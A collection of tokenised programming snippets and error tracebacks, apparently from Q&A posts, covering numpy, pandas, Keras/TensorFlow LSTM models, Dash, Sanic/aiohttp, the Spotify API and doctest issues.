key ] = module_name 280 /Users/danielacker/anaconda2/lib/python2.7/distutils/command/build_ext.pyc in run ( self ) 337 338 # Now actually compile and link everything. -- > 339 self.build_extensions ( ) 340 341 def check_extensions_list ( self , extensions ) : /Users/danielacker/anaconda2/lib/python2.7/distutils/command/build_ext.pyc in build_extensions ( self ) 446 447 for ext in self.extensions : -- > 448 self.build_extension ( ext ) 449 450 def build_extension ( self , ext ) : /Users/danielacker/anaconda2/lib/python2.7/distutils/command/build_ext.pyc in build_extension ( self , ext ) 496 debug=self.debug , 497 extra_postargs=extra_args , -- > 498 depends=ext.depends ) 499 500 # XXX -- this is a Vile HACK ! /Users/danielacker/anaconda2/lib/python2.7/distutils/ccompiler.pyc in compile ( self , sources , output_dir , macros , include_dirs , debug , extra_preargs , extra_postargs , depends ) 572 except KeyError : 573 continue -- > 574 self._compile ( obj , src , ext , cc_args , extra_postargs , pp_opts ) 575 576 # Return *all* object filenames , not just the ones we just built./Users/danielacker/anaconda2/lib/python2.7/distutils/unixccompiler.pyc in _compile ( self , obj , src , ext , cc_args , extra_postargs , pp_opts ) 120 extra_postargs ) 121 except DistutilsExecError , msg : -- > 122 raise CompileError , msg 123 124 def create_static_lib ( self , objects , output_libname , CompileError : command 'gcc ' failed with exit status 1"
"lst = [ [ ] , [ ] , [ ] ] lst = [ [ ] ] * 3 lst = [ [ ] for i in range ( 3 ) ] lst = [ [ ] ] *3lst [ 0 ] = [ 5 ] lst [ 0 ] .append ( 3 )"
"i = np.array ( [ 1,5,2,6,4,3,6,7,4,3,2 ] ) v = np.array ( [ 2,5,2,3,4,1,2,1,6,4,2 ] ) d = np.zeros ( 10 ) for index , value in enumerate ( v ) : idx = i [ index ] d [ idx ] += v [ index ]"
"./myscript -- help Usage : myscript [ options ] Options : -h , -- help show this help message and exit -u USER , -- user=USER resources owned by this username ./myscript -- user myuser usage : smyscript [ -h ] [ -- auth_host_name AUTH_HOST_NAME ] [ -- noauth_local_webserver ] [ -- auth_host_port [ AUTH_HOST_PORT [ AUTH_HOST_PORT ... ] ] ] [ -- logging_level { DEBUG , INFO , WARNING , ERROR , CRITICAL } ] myscript : error : unrecognized arguments : -- user myuser import oauth2clientimport argparsedef execute ( ) : parser = argparse.ArgumentParser ( description=__doc__ , formatter_class=argparse.RawDescriptionHelpFormatter , parents= [ tools.argparser ] ) # do n't use any flags flags = parser.parse_args ( None ) flow = client.flow_from_clientsecrets ( client_secret_path , scope=scope_path , message=tools.message_if_missing ( client_secret ) ) # open credential storage path credential_storage = file.Storage ( self._credential_storage_path ) credentials = credential_storage.get ( ) # get credentails if necessary if credentials is None or credentials.invalid : credentials = tools.run_flow ( flow , credential_storage , flags ) import myown_oauth2client_wrapperfrom optparse import OptionParserif __name__ == `` __main__ '' : usage = `` something '' parser_ = OptionParser ( usage ) parser_.add_option ( `` -u '' , '' -- user '' ) ( options_ , args ) = parser_.parse_args ( ) myown_oauth2client_wrapper.execute ( )"
"np.random.seed ( 0 ) D_pair_value = dict ( ) for pair in itertools.combinations ( list ( `` ABCD '' ) ,2 ) : D_pair_value [ pair ] = np.random.randint ( 0,5 ) D_pair_value # { ( ' A ' , ' B ' ) : 4 , # ( ' A ' , ' C ' ) : 0 , # ( ' A ' , 'D ' ) : 3 , # ( ' B ' , ' C ' ) : 3 , # ( ' B ' , 'D ' ) : 3 , # ( ' C ' , 'D ' ) : 1 } D_nested_dict = defaultdict ( dict ) for ( p , q ) , value in D_pair_value.items ( ) : D_nested_dict [ p ] [ q ] = value D_nested_dict [ q ] [ p ] = value # Fill diagonal with zerosDF = pd.DataFrame ( D_nested_dict ) np.fill_diagonal ( DF.values , 0 ) DF"
"people.exclude ( twitter_handle=None ) .distinct ( 'twitter_handle ' ) .values_list ( 'twitter_handle ' , flat=True ) [ 'Abc ' , 'abc ' ] [ 'abc ' ]"
: py : class : ` logging.Logger `
"import osimport numpy as npfrom matplotlib import pyplot as pltimport keras # Number of vectors to consider in the time windowlook_back = 50N_datapoints = 2000train_split = 0.8 # Generate a time signal composed of a linear function and a sinusoidt = np.linspace ( 0 , 200 , N_datapoints ) y = t**2 + np.sin ( t*2 ) *1000y -= y.mean ( ) y /= y.std ( ) plt.plot ( y ) # Reshape the signal into fixed windows for trainingdef create_blocks ( y , look_back=1 ) : x_data , y_data = [ ] , [ ] for i in range ( 0 , len ( y ) -look_back-1 ) : x_data.append ( y [ i : i+look_back ] ) y_data.append ( y [ i+look_back ] ) return np.array ( x_data ) , np.array ( y_data ) x_data , y_data = create_blocks ( y , look_back ) # Split data in training and testingN_train = int ( x_data.shape [ 0 ] *train_split ) x_train = x_data [ : N_train , : , None ] y_train = y_data [ : N_train , ] x_test = x_data [ N_train : -1 , : , None ] y_test = y_data [ N_train : -1 : , ] # Get the time vector for train and test ( just to plot ) t_train = t [ 0 : N_train-1 , None ] t_test = t [ N_train : -1 , None ] # Networkfrom keras import Model , Inputfrom keras.layers import LSTM , Dense , Activation , BatchNormalization , Dropoutinputs = Input ( shape= ( look_back , 1 ) ) net = LSTM ( 32 , return_sequences=False ) ( inputs ) net = Dense ( 32 ) ( net ) net = Dropout ( 0.25 ) ( net ) outputs = Dense ( 1 ) ( net ) model = Model ( inputs=inputs , outputs=outputs ) model.compile ( optimizer=keras.optimizers.rmsprop ( ) , loss='mean_squared_error ' ) model.summary ( ) # Callbackfrom keras.callbacks import Callbackclass PlotResuls ( Callback ) : def on_train_begin ( self , logs=None ) : self.fig = plt.figure ( ) def save_data ( self , x_test , y , look_back , t_test ) : self.x_test = x_test self.y = y self.t_test = t_test self.look_back = look_back def on_epoch_end ( self , epoch , logs=None ) : if epoch % 20 == 0 : plt.clf ( ) y_pred = self.x_test [ 0 , ... ] for i in range ( len ( x_test ) +1 ) : new_prediction = model.predict ( y_pred [ None , -self.look_back : , ] ) y_pred = np.concatenate ( ( y_pred , new_prediction ) , axis=0 ) plt.plot ( t , y , label='GT ' ) plt.plot ( self.t_test , y_pred , '.- ' , label='Predicted ' ) plt.legend ( ) plt.pause ( 0.01 ) plt.savefig ( 'lstm_ % d.png ' % epoch ) plot_results = PlotResuls ( ) plot_results.save_data ( x_test , y , look_back , t_test ) model.fit ( x_train , y_train , validation_data= ( x_test , y_test ) , epochs=100000 , batch_size=32 , callbacks= [ plot_results ] )"
"import dashimport dash_core_components as dccimport dash_html_components as htmlprint ( dcc.__version__ ) # 0.6.0 or above is requiredexternal_stylesheets = [ 'https : //codepen.io/chriddyp/pen/bWLwgP.css ' ] app = dash.Dash ( __name__ , external_stylesheets=external_stylesheets ) dfm = pd.DataFrame ( { 'word ' : [ 'apple ' , 'pear ' , 'orange ' ] , 'freq ' : [ 1,3,9 ] } ) app.layout = html.Div ( [ html.Img ( id = 'image_wc ' ) ] ) # function to make wordcoud from word frequency dataframedef plot_wordcloud ( data ) : d = { } for a , x in data.values : d [ a ] = x wc = WordCloud ( background_color='black ' , width=1800 , height=1400 ) .generate_from_frequencies ( frequencies=d ) return ( wc ) @ app.callback ( dash.dependencies.Output ( 'image_wc ' , 'img ' ) ) def make_image ( ) : img = plot_wordcloud ( data = dfm ) return ( img ) if __name__ == '__main__ ' : app.run_server ( debug=True )"
"from textwrap import wrapDICO = { '\x00 ' : '00 ' , '\x04 ' : '0100 ' , '\x08 ' : '01000 ' , '\x0c ' : '01100 ' , '\x10 ' : '010000 ' , '\x14 ' : '010100 ' , '\x18 ' : '011000 ' , '\x1c ' : '011100 ' , ' ' : '0100000 ' , ' $ ' : '0100100 ' , ' ( ' : '0101000 ' , ' , ' : '0101100 ' , ' 0 ' : '0110000 ' , ' 4 ' : '0110100 ' , ' 8 ' : '0111000 ' , ' < ' : '0111100 ' , ' @ ' : '01000000 ' , 'D ' : '01000100 ' , ' H ' : '01001000 ' , ' L ' : '01001100 ' , ' P ' : '01010000 ' , 'T ' : '01010100 ' , ' X ' : '01011000 ' , '\\ ' : '01011100 ' , ' ` ' : '01100000 ' , 'd ' : '01100100 ' , ' h ' : '01101000 ' , ' l ' : '01101100 ' , ' p ' : '01110000 ' , 't ' : '01110100 ' , ' x ' : '01111000 ' , '| ' : '01111100 ' , '\x03 ' : '011 ' , '\x07 ' : '0111 ' , '\x0b ' : '01011 ' , '\x0f ' : '01111 ' , '\x13 ' : '010011 ' , '\x17 ' : '010111 ' , '\x1b ' : '011011 ' , '\x1f ' : '011111 ' , ' # ' : '0100011 ' , '' ' '' : '0100111 ' , '+ ' : '0101011 ' , '/ ' : '0101111 ' , ' 3 ' : '0110011 ' , ' 7 ' : '0110111 ' , ' ; ' : '0111011 ' , ' ? ' : '0111111 ' , ' C ' : '01000011 ' , ' G ' : '01000111 ' , ' K ' : '01001011 ' , ' O ' : '01001111 ' , 'S ' : '01010011 ' , ' W ' : '01010111 ' , ' [ ' : '01011011 ' , ' _ ' : '01011111 ' , ' c ' : '01100011 ' , ' g ' : '01100111 ' , ' k ' : '01101011 ' , ' o ' : '01101111 ' , 's ' : '01110011 ' , ' w ' : '01110111 ' , ' { ' : '01111011 ' , '\x7f ' : '01111111 ' , '\x02 ' : '010 ' , '\x06 ' : '0110 ' , '\n ' : '01010 ' , '\x0e ' : '01110 ' , '\x12 ' : '010010 ' , '\x16 ' : '010110 ' , '\x1a ' : '011010 ' , '\x1e ' : '011110 ' , ' '' ' : '0100010 ' , ' & ' : '0100110 ' , '* ' : '0101010 ' , ' . ' : '0101110 ' , ' 2 ' : '0110010 ' , ' 6 ' : '0110110 ' , ' : ' : '0111010 ' , ' > ' : '0111110 ' , ' B ' : '01000010 ' , ' F ' : '01000110 ' , ' J ' : '01001010 ' , ' N ' : '01001110 ' , ' R ' : '01010010 ' , ' V ' : '01010110 ' , ' Z ' : '01011010 ' , '^ ' : '01011110 ' , ' b ' : '01100010 ' , ' f ' : '01100110 ' , ' j ' : '01101010 ' , ' n ' : '01101110 ' , ' r ' : '01110010 ' , ' v ' : '01110110 ' , ' z ' : '01111010 ' , '~ ' : '01111110 ' , '\x01 ' : '01 ' , '\x05 ' : '0101 ' , '\t ' : '01001 ' , '\r ' : '01101 ' , '\x11 ' : '010001 ' , '\x15 ' : '010101 ' , '\x19 ' : '011001 ' , '\x1d ' : '011101 ' , ' ! ' : '0100001 ' , ' % ' : '0100101 ' , ' ) ' : '0101001 ' , '- ' : '0101101 ' , ' 1 ' : '0110001 ' , ' 5 ' : '0110101 ' , ' 9 ' : '0111001 ' , '= ' : '0111101 ' , ' A ' : '01000001 ' , ' E ' : '01000101 ' , ' I ' : '01001001 ' , 'M ' : '01001101 ' , ' Q ' : '01010001 ' , ' U ' : '01010101 ' , ' Y ' : '01011001 ' , ' ] ' : '01011101 ' , ' a ' : '01100001 ' , ' e ' : '01100101 ' , ' i ' : '01101001 ' , 'm ' : '01101101 ' , ' q ' : '01110001 ' , ' u ' : '01110101 ' , ' y ' : '01111001 ' , ' } ' : '01111101 ' } def decrypt ( binary ) : `` '' '' Function to convert binary into string '' '' '' binary = wrap ( binary , 8 ) ch = `` for b in binary : for i , j in DICO.items ( ) : if j == b : ch += i return ch"
"import torchfrom torch.autograd import Variablet = torch.rand ( ( 2,2,4 ) ) x = Variable ( t ) print ( x ) shape = x.size ( ) for i in range ( shape [ 0 ] ) : for j in range ( shape [ 1 ] ) : print ( x [ i , j ] ) Variable containing : ( 0 , . , . ) = 0.6717 0.8216 0.5100 0.9106 0.3280 0.8182 0.5781 0.3919 ( 1 , . , . ) = 0.8823 0.4237 0.6620 0.0817 0.5781 0.4187 0.3769 0.0498 [ torch.FloatTensor of size 2x2x4 ] Variable containing : 0.6717 0.8216 0.5100 0.9106 [ torch.FloatTensor of size 4 ] Variable containing : 0.3280 0.8182 0.5781 0.3919 [ torch.FloatTensor of size 4 ] Variable containing : 0.8823 0.4237 0.6620 0.0817 [ torch.FloatTensor of size 4 ] Variable containing : 0.5781 0.4187 0.3769 0.0498 [ torch.FloatTensor of size 4 ]"
`` abc '' .match ( /ab\Kc/ ) # matches `` c '' `` abc '' .match ( / ( ? < =ab ) c/ ) # matches `` c ''
"import numpy as npv=np.array ( [ 1,2,3,4,74,73,72,71,9,10 ] ) g=np.array ( [ 0,0,0,0,1,1,1,1,2,2 ] ) mask=np.concatenate ( ( [ True ] , np.diff ( g ) ! =0 ) ) v [ mask ] array ( [ 1 , 74 , 9 ] ) import numpy as npimport timeN=10000000v=np.arange ( N ) Nelemes_per_group=10Ngroups=N/Nelemes_per_groups=np.arange ( Ngroups ) g=np.repeat ( s , Nelemes_per_group ) start1=time.time ( ) r=np.maximum.reduceat ( v , np.unique ( g , return_index=True ) [ 1 ] ) end1=time.time ( ) print ( 'END first method , T= ' , ( end1-start1 ) , 's ' ) start3=time.time ( ) np.array ( list ( map ( np.max , np.split ( v , np.where ( np.diff ( g ) ! =0 ) [ 0 ] +1 ) ) ) ) end3=time.time ( ) print ( 'END second method , ( map returns an iterable ) T= ' , ( end3-start3 ) , 's ' ) END first method , T= 1.6057236194610596 sEND second method , ( map returns an iterable ) T= 8.346540689468384 s"
@ pytest.fixture ( scope= '' module '' ) def db ( ) : return DB ( )
@ app.route ( `` / '' ) def index ( ) : # index.html has the angular SAP return make_response ( open ( 'build/index.html ' ) .read ( ) ) hellworld.pyrequirements.txtrunp-heroku.pyprocfileGruntfile.jsbuild/ //test code assets/ index.html vendor/bin/ //production code assets/ index.html vendor/src/ //original code assets/ index.html vendor/
"# the code block that follows is irrelevantimport numpy as npk = [ ] for s in [ 2103 , 1936 , 2247 , 2987 ] : np.random.seed ( s ) k.append ( np.random.randint ( 0 , 2 , size= ( 2,6 ) ) ) arr = np.hstack ( [ np.vstack ( k ) [ : , : -1 ] , np.vstack ( k ) .T [ : :-1 ] .T ] ) image = np.zeros ( shape= ( arr.shape [ 0 ] +2 , arr.shape [ 1 ] +2 ) ) image [ 1 : -1 , 1 : -1 ] = arr import matplotlib.pyplot as pltplt.contour ( image [ : :-1 ] , [ 0.5 ] , colors= ' r ' )"
images = svg_doc.getElementsByTagName ( 'image ' ) image_siblings = [ ] for img in images : if img.parentNode.getAttribute ( 'layertype ' ) == 'transfer ' : if img.nextSibling is not None : if img.nextSibling.nodeName == 'image ' : image_siblings.append ( img.nextSibling ) elif img.nextSibling.nextSibling is not None and img.nextSibling.nextSibling.nodeName == 'image ' : image_siblings.append ( img.nextSibling.nextSibling )
"y_pred = model.predict_generator ( gen ) plot_points = 40epochs = range ( 1 , plot_points + 1 ) pred_points = numpy.resize ( y_pred [ : plot_points ] , ( plot_points , ) ) target_points = gen.targets [ : plot_points ] plt.plot ( epochs , pred_points , ' b ' , label='Predictions ' ) plt.plot ( epochs , target_points , ' r ' , label='Targets ' ) plt.legend ( ) plt.show ( ) train_gen = keras.preprocessing.sequence.TimeseriesGenerator ( x , y , length=1 , sampling_rate=1 , batch_size=1 , shuffle=False ) model = Sequential ( ) model.add ( LSTM ( 32 , input_shape= ( 1 , 1 ) , return_sequences=False ) ) model.add ( Dense ( 1 , input_shape= ( 1 , 1 ) ) ) model.compile ( loss= '' mse '' , optimizer= '' rmsprop '' , metrics= [ keras.metrics.mean_squared_error ] ) history = model.fit_generator ( train_gen , epochs=20 , steps_per_epoch=100 )"
"[ 09/07/2019 07:02:00 > 0dd02c : SYS INFO ] Status changed to Initializing [ 09/07/2019 07:02:00 > 0dd02c : SYS INFO ] Run script 'run.bat ' with script host - 'WindowsScriptHost ' [ 09/07/2019 07:02:00 > 0dd02c : SYS INFO ] Status changed to Running [ 09/07/2019 07:02:00 > 0dd02c : ERR ] The filename , directory name , or volume label syntax is incorrect . [ 09/07/2019 07:02:00 > 0dd02c : INFO ] [ 09/07/2019 07:02:00 > 0dd02c : INFO ] D : \local\Temp\jobs\triggered\z\2az54ret.wh4 > D : \home\python364x86\python.exe trading.py [ 09/07/2019 07:02:00 > 0dd02c : SYS INFO ] Status changed to Failed [ 09/07/2019 07:02:00 > 0dd02c : SYS ERR ] Job failed due to exit code 1 public void StartTheBot ( ) { // Local //var fileName = @ '' C : \Users\robert\AppData\Local\Programs\Python\Python37-32\python.exe '' ; //var script = @ '' C : \python-scripts\trading.py '' ; // Production var fileName = @ '' D : \home\python364x86\python.exe '' ; var script = @ '' D : \home\python364x86\trading.py '' ; var errors = `` '' ; var results = `` '' ; ProcessStartInfo psi = new ProcessStartInfo { FileName = fileName , Arguments = script , UseShellExecute = false , RedirectStandardOutput = true , RedirectStandardError = true , CreateNoWindow = true } ; using ( Process process = Process.Start ( psi ) ) { errors = process.StandardError.ReadToEnd ( ) ; results = process.StandardOutput.ReadToEnd ( ) ; } Console.WriteLine ( `` Errors : '' ) ; Console.WriteLine ( errors ) ; Console.WriteLine ( ) ; Console.WriteLine ( `` Results : '' ) ; Console.WriteLine ( results ) ; } import telegrammy_token = 'mytoken'bot = telegram.Bot ( token = my_token ) chat_id = 'mychatid'message = 'Hellobot.sendMessage ( chat_id=chat_id , text=message )"
"class Category ( db.Model ) : __tablename__ = 'categories ' id = db.Column ( db.Integer , primary_key=True ) parent_id = db.Column ( db.Integer , db.ForeignKey ( id ) , nullable=True ) level = db.Column ( db.SmallInteger ) name = db.Column ( db.String ( 200 ) ) children = db.relationship ( 'Category ' , backref=backref ( 'parent ' , remote_side=id ) ) def __repr__ ( self ) : return ' < Category % r > ' % ( self.name ) NameError : name 'backref ' is not defined"
from django import httpfrom django.core import managementdef syncdb ( request ) : management.call_command ( 'syncdb ' ) return http.HttpResponse ( 'Database synced . ' )
"from sanic import Sanicfrom sanic import responsefrom aiohttp import ClientSessionfrom asyncio import gatherapp = Sanic ( ) @ app.listener ( 'before_server_start ' ) async def init ( app , loop ) : app.session = ClientSession ( loop=loop ) @ app.route ( '/test ' ) async def test ( request ) : data_tasks = [ ] # The error only happened when a large amount of images were used for imageURL in request.json [ 'images ' ] : data_tasks.append ( getRaw ( imageURL ) ) await gather ( *data_tasks ) return response.text ( 'done ' ) async def getRaw ( url ) : async with app.session.get ( url ) as resp : return await resp.read ( ) Traceback ( most recent call last ) : File `` /usr/local/lib/python3.5/dist-packages/sanic/app.py '' , line 750 , in handle_request response = await response File `` server-sanic.py '' , line 53 , in xlsx await gather ( *data_tasks ) File `` /usr/lib/python3.5/asyncio/futures.py '' , line 361 , in __iter__ yield self # This tells Task to wait for completion . File `` /usr/lib/python3.5/asyncio/tasks.py '' , line 296 , in _wakeup future.result ( ) File `` /usr/lib/python3.5/asyncio/futures.py '' , line 274 , in result raise self._exception File `` /usr/lib/python3.5/asyncio/tasks.py '' , line 241 , in _step result = coro.throw ( exc ) File `` server-sanic.py '' , line 102 , in add_data_to_sheet await add_img_to_sheet ( sheet , rowIndex , colIndex , val ) File `` server-sanic.py '' , line 114 , in add_img_to_sheet image_data = BytesIO ( await getRaw ( imgUrl ) ) File `` server-sanic.py '' , line 138 , in getRaw async with app.session.get ( url ) as resp : File `` /usr/local/lib/python3.5/dist-packages/aiohttp/client.py '' , line 690 , in __aenter__ self._resp = yield from self._coro File `` /usr/local/lib/python3.5/dist-packages/aiohttp/client.py '' , line 277 , in _request yield from resp.start ( conn , read_until_eof ) File `` /usr/local/lib/python3.5/dist-packages/aiohttp/client_reqrep.py '' , line 637 , in start self._continue = None File `` /usr/local/lib/python3.5/dist-packages/aiohttp/helpers.py '' , line 732 , in __exit__ raise asyncio.TimeoutError from Noneconcurrent.futures._base.TimeoutError"
"url = '/v1/users/'+ spotify_user_id +'/playlists/'+ playlist_id +'/tracks ' data = json.dumps ( { `` tracks '' : [ { `` uri '' : track_uri } ] } ) headers = { 'Authorization ' : 'Bearer ' + access_token , 'Content-Type ' : 'application/json ' } conn = httplib.HTTPSConnection ( 'api.spotify.com ' ) conn.request ( 'DELETE ' , url , data , headers ) resp = conn.getresponse ( ) content = resp.read ( ) return json.loads ( content ) url = 'https : //api.spotify.com/v1/users/'+ spotify_user_id +'/playlists/'+ playlist_id +'/tracks ' data = json.dumps ( { `` tracks '' : [ { `` uri '' : track_uri } ] } ) headers = { 'Authorization ' : 'Bearer ' + access_token , 'Content-Type ' : 'application/json ' } opener = urllib2.build_opener ( urllib2.HTTPHandler ) req = urllib2.Request ( url , data , headers ) req.get_method = lambda : 'DELETE ' try : response = opener.open ( req ) .read ( ) return response except urllib2.HTTPError as e : return e"
"from warnings import warnclass Foo ( object ) : `` '' '' Instantiating Foo always gives a warning : > > > foo = Foo ( ) testdocs.py:14 : UserWarning : Boo ! warn ( `` Boo ! `` , UserWarning ) > > > `` '' '' def __init__ ( self ) : warn ( `` Boo ! `` , UserWarning ) testdocs.py:14 : UserWarning : Boo ! warn ( `` Boo ! `` , UserWarning ) **********************************************************************File `` testdocs.py '' , line 7 , in testdocs.FooFailed example : foo = Foo ( ) Expected : testdocs.py:14 : UserWarning : Boo ! warn ( `` Boo ! `` , UserWarning ) Got nothing**********************************************************************1 items had failures : 1 of 1 in testdocs.Foo***Test Failed*** 1 failures ."
"countA week1 264 week2 29B week1 152 week2 15 count percentA week1 264 0.9 week2 29 0.1B week1 152 0.91 week2 15 0.09 mydf.sum ( level= [ 0 , 1 ] )"
"num_units : 50 , batch_size : 1000 ; fails OOM ( gpu ) before 1st batch as expectednum_units : 50 , batch_size : 800 , fails OOM ( gpu ) before 1st batch as expectednum_units : 50 , batch_size : 750 ; fails OOM ( gpu ) after 10th batch ( ? ? ? ) num_units : 50 , batch_size : 500 ; fails OOM ( gpu ) after 90th batch ( ? ? ? ) num_units : 50 , batch_size : 300 ; fails OOM ( gpu ) after 540th batch ( ? ? ? ) num_units : 50 , batch_size : 200 ; computer freezes after around 900 batches with 100 % ram usenum_units : 50 , batch_size : 100 ; passes 1 epoch -- may fail later ( unknown ) Traceback ( most recent call last ) : File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/client/session.py '' , line 1323 , in _do_call return fn ( *args ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/client/session.py '' , line 1302 , in _run_fn status , run_metadata ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/framework/errors_impl.py '' , line 473 , in __exit__ c_api.TF_GetCode ( self.status.status ) ) tensorflow.python.framework.errors_impl.ResourceExhaustedError : OOM when allocating tensor with shape [ 500,80 ] [ [ Node : decoder/while/BasicDecoderStep/basic_lstm_cell/MatMul = MatMul [ T=DT_FLOAT , transpose_a=false , transpose_b=false , _device= '' /job : localhost/replica:0/task:0/device : GPU:0 '' ] ( decoder/while/BasicDecoderStep/basic_lstm_cell/concat , decoder/while/BasicDecoderStep/basic_lstm_cell/MatMul/Enter ) ] ] [ [ Node : gradients/Add/_282 = _Recv [ client_terminated=false , recv_device= '' /job : localhost/replica:0/task:0/device : CPU:0 '' , send_device= '' /job : localhost/replica:0/task:0/device : GPU:0 '' , send_device_incarnation=1 , tensor_name= '' edge_457_gradients/Add '' , tensor_type=DT_FLOAT , _device= '' /job : localhost/replica:0/task:0/device : CPU:0 '' ] ( ^_cloopdecoder/while/BasicDecoderStep/TrainingHelperNextInputs/add/y/_181 ) ] ] During handling of the above exception , another exception occurred : Traceback ( most recent call last ) : File `` /home/nave01314/IdeaProjects/tf-nmt/main.py '' , line 89 , in < module > _ = sess.run ( [ update_step ] ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/client/session.py '' , line 889 , in run run_metadata_ptr ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/client/session.py '' , line 1120 , in _run feed_dict_tensor , options , run_metadata ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/client/session.py '' , line 1317 , in _do_run options , run_metadata ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/client/session.py '' , line 1336 , in _do_call raise type ( e ) ( node_def , op , message ) tensorflow.python.framework.errors_impl.ResourceExhaustedError : OOM when allocating tensor with shape [ 500,80 ] [ [ Node : decoder/while/BasicDecoderStep/basic_lstm_cell/MatMul = MatMul [ T=DT_FLOAT , transpose_a=false , transpose_b=false , _device= '' /job : localhost/replica:0/task:0/device : GPU:0 '' ] ( decoder/while/BasicDecoderStep/basic_lstm_cell/concat , decoder/while/BasicDecoderStep/basic_lstm_cell/MatMul/Enter ) ] ] [ [ Node : gradients/Add/_282 = _Recv [ client_terminated=false , recv_device= '' /job : localhost/replica:0/task:0/device : CPU:0 '' , send_device= '' /job : localhost/replica:0/task:0/device : GPU:0 '' , send_device_incarnation=1 , tensor_name= '' edge_457_gradients/Add '' , tensor_type=DT_FLOAT , _device= '' /job : localhost/replica:0/task:0/device : CPU:0 '' ] ( ^_cloopdecoder/while/BasicDecoderStep/TrainingHelperNextInputs/add/y/_181 ) ] ] Caused by op 'decoder/while/BasicDecoderStep/basic_lstm_cell/MatMul ' , defined at : File `` /home/nave01314/IdeaProjects/tf-nmt/main.py '' , line 49 , in < module > outputs , _ , _ = tf.contrib.seq2seq.dynamic_decode ( decoder ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/contrib/seq2seq/python/ops/decoder.py '' , line 309 , in dynamic_decode swap_memory=swap_memory ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/ops/control_flow_ops.py '' , line 2819 , in while_loop result = loop_context.BuildLoop ( cond , body , loop_vars , shape_invariants ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/ops/control_flow_ops.py '' , line 2643 , in BuildLoop pred , body , original_loop_vars , loop_vars , shape_invariants ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/ops/control_flow_ops.py '' , line 2593 , in _BuildLoop body_result = body ( *packed_vars_for_body ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/contrib/seq2seq/python/ops/decoder.py '' , line 254 , in body decoder_finished ) = decoder.step ( time , inputs , state ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/contrib/seq2seq/python/ops/basic_decoder.py '' , line 138 , in step cell_outputs , cell_state = self._cell ( inputs , state ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/ops/rnn_cell_impl.py '' , line 290 , in __call__ return base_layer.Layer.__call__ ( self , inputs , state , scope=scope ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/layers/base.py '' , line 618 , in __call__ outputs = self.call ( inputs , *args , **kwargs ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/ops/rnn_cell_impl.py '' , line 567 , in call array_ops.concat ( [ inputs , h ] , 1 ) , self._kernel ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/ops/math_ops.py '' , line 1993 , in matmul a , b , transpose_a=transpose_a , transpose_b=transpose_b , name=name ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/ops/gen_math_ops.py '' , line 2532 , in _mat_mul name=name ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/framework/op_def_library.py '' , line 787 , in _apply_op_helper op_def=op_def ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/framework/ops.py '' , line 3081 , in create_op op_def=op_def ) File `` /home/nave01314/anaconda3/lib/python3.6/site-packages/tensorflow/python/framework/ops.py '' , line 1528 , in __init__ self._traceback = self._graph._extract_stack ( ) # pylint : disable=protected-accessResourceExhaustedError ( see above for traceback ) : OOM when allocating tensor with shape [ 500,80 ] [ [ Node : decoder/while/BasicDecoderStep/basic_lstm_cell/MatMul = MatMul [ T=DT_FLOAT , transpose_a=false , transpose_b=false , _device= '' /job : localhost/replica:0/task:0/device : GPU:0 '' ] ( decoder/while/BasicDecoderStep/basic_lstm_cell/concat , decoder/while/BasicDecoderStep/basic_lstm_cell/MatMul/Enter ) ] ] [ [ Node : gradients/Add/_282 = _Recv [ client_terminated=false , recv_device= '' /job : localhost/replica:0/task:0/device : CPU:0 '' , send_device= '' /job : localhost/replica:0/task:0/device : GPU:0 '' , send_device_incarnation=1 , tensor_name= '' edge_457_gradients/Add '' , tensor_type=DT_FLOAT , _device= '' /job : localhost/replica:0/task:0/device : CPU:0 '' ] ( ^_cloopdecoder/while/BasicDecoderStep/TrainingHelperNextInputs/add/y/_181 ) ] ] import tensorflow as tffrom tensorflow.python.layers import core as layers_coreclass NMTModel : def __init__ ( self , hparams , iterator , mode ) : source , target_in , target_out , source_lengths , target_lengths = iterator.get_next ( ) true_batch_size = tf.size ( source_lengths ) # Lookup embeddings embedding_encoder = tf.get_variable ( `` embedding_encoder '' , [ hparams.src_vsize , hparams.src_emsize ] ) encoder_emb_inp = tf.nn.embedding_lookup ( embedding_encoder , source ) embedding_decoder = tf.get_variable ( `` embedding_decoder '' , [ hparams.tgt_vsize , hparams.tgt_emsize ] ) decoder_emb_inp = tf.nn.embedding_lookup ( embedding_decoder , target_in ) # Build and run Encoder LSTM encoder_cell = tf.nn.rnn_cell.BasicLSTMCell ( hparams.num_units ) encoder_outputs , encoder_state = tf.nn.dynamic_rnn ( encoder_cell , encoder_emb_inp , sequence_length=source_lengths , dtype=tf.float32 ) # Build and run Decoder LSTM with Helper and output projection layer decoder_cell = tf.nn.rnn_cell.BasicLSTMCell ( hparams.num_units ) projection_layer = layers_core.Dense ( hparams.tgt_vsize , use_bias=False ) # if mode is 'TRAIN ' or mode is 'EVAL ' : # then decode using TrainingHelper # helper = tf.contrib.seq2seq.TrainingHelper ( decoder_emb_inp , sequence_length=target_lengths ) # elif mode is 'INFER ' : # then decode using Beam Search # helper = tf.contrib.seq2seq.GreedyEmbeddingHelper ( embedding_decoder , tf.fill ( [ true_batch_size ] , hparams.sos ) , hparams.eos ) helper = tf.contrib.seq2seq.GreedyEmbeddingHelper ( embedding_decoder , tf.fill ( [ true_batch_size ] , hparams.sos ) , hparams.eos ) decoder = 